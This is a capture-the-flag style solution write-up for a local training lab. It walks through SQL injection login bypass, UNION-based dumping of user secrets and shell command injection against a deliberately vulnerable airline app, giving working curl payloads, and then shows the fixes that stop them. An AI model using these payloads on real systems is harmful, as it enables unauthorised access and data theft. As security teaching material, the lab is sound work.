🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A05 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

All requests below are against vulnerable (port 8041). In a browser, the payloads go into the same fields — the site and `/ui` show identical results.

## 1. Login bypass

The query in the application is built like this:

```sql
SELECT username, role, secret FROM users WHERE username = '<login>' AND password = '<password>'
```

If you put `admin'--` into the login, everything after `--` becomes a comment, and the password check disappears:

```sql
... WHERE username = 'admin'--' AND password = 'x'
```

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
# → logged in as admin and FLAG{a05_sqli_login_bypass}
```

The same flag is returned by `GET /me` while you are signed in as admin (open `/admin` in the browser).

Another option: the login `nobody' OR '1'='1' --` — the condition becomes always true and you are signed in as the first user in the table.

## 2. The hidden charter flight

The search query contains `AND hidden = 0`. A quote with `OR 1=1` makes the condition always true, and `--` throws the rest away:

```bash
curl -G http://127.0.0.1:8041/flights \
  --data-urlencode "from=" --data-urlencode "to=%' OR 1=1 --"
# → among the usual flights: "SK 900" — the charter
```

Open it: `GET /flight/6` — the note field contains `FLAG{a05_hidden_flight}`.

Try `to='` alone: the page returns the SQL error text (`unrecognized token`). Such errors help an attacker understand the structure of the query, so they must never be shown to the user. Another example: `max_price=abc` → `no such column: abc`.

## 3. UNION: data from another table

The search returns 7 columns (`id, flight_no, origin, destination, dep_date, dep_time, price`), so `UNION SELECT` must return exactly 7 too:

```bash
curl -G http://127.0.0.1:8041/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → flight_no holds the username, destination holds the secret:
#   admin -> FLAG{a05_sqli_union_dump}
```

In the browser the fake "flights" show up in the same list: `admin → FLAG{...}`.

## 4. Command injection in the node check

First get an admin session (step 1), then send a host with a shell separator:

```bash
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8041/admin/check
# → {"output":"FLAG{a05_command_injection}\n"}
```

The application runs `ping -c 1 <host>` through `os.popen`, i.e. through a shell, so `;` starts a second command — and the flag lives in the process environment (`A05_FLAG`), which the shell sees. On Windows the separator is `&` and the variable is written `%A05_FLAG%`. In a browser: `/admin` → «Airport node check» → host `localhost; echo $A05_FLAG`.

## Fixes (fixed, port 8042)

| Problem | Fix |
|---------|-----|
| String concatenation in SQL (login, search) | Parameterized queries: `... WHERE username = ?`, `origin LIKE ?`; values are limited by length and format |
| `hidden = 0` neutralized by `OR 1=1` | The condition and the values live in different parts of the query — the data cannot change the structure |
| Database error text in the response | The SQL error no longer occurs, and the message shown is generic |
| A command string built from user input | No shell at all: the host must match `^[A-Za-z0-9.-]+$` and is resolved by `socket.gethostbyname` |
| The flag in the process environment | The fixed version does not put secrets into the environment |

Check on fixed (port 8042):

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login        # 401
curl -G http://127.0.0.1:8042/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → 0 rows: the payload is searched for as an ordinary string
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-lab-pass"}' http://127.0.0.1:8042/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8042/admin/check
# → invalid host: 'localhost; echo $A05_FLAG' (allowed: letters, digits, dot, dash)
```

## What else to remember
- Parameterization protects values, but not table and column names: they must never come from input, only from an allowlist.
- Injection is not limited to SQL: commands of the OS, LDAP, NoSQL queries, log entries. The principle is always the same: data must not be mixed with code.
- Input validation is a whitelist, not a blacklist: "no semicolons" loses to `$IFS`, newlines and dozens of other tricks.
- The login bypass worked because the password was checked *inside* SQL. Compare secrets in the application code (see lab A04 for how to store them).
